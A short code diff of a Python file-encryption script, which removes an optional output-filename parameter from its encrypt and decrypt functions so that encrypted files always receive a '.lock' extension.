@@ -7,10 +7,9 @@ import shutil
 
 
 
-def encrypt(key, path, in_filename, out_filename=None, chunk_size=64*1024):############### Encrypt function ##################
+def encrypt(key, path, in_filename, chunk_size=64*1024):############### Encrypt function ##################
 
-	if not out_filename:
-		out_filename = os.path.splitext(in_filename)[0] + '.lock'
+	out_filename = os.path.splitext(in_filename)[0] + '.lock'
 
 	iv = get_random_bytes(16)#################### Creating initial vector ###############################
 
@@ -47,10 +46,9 @@ def encrypt(key, path, in_filename, out_filename=None, chunk_size=64*1024):#####
 	else:
 		print(f"Successfully encrypted file: {in_filename} to {out_filename}")
 
-def decrypt(key, path, in_filename, out_filename=None, chunk_size=64*1024):############### Decrypt function ################
+def decrypt(key, path, in_filename, chunk_size=64*1024):############### Decrypt function ################
 
-	if not out_filename:
-		out_filename = os.path.splitext(in_filename)[0]
+	out_filename = os.path.splitext(in_filename)[0]
 
 	
 	try:
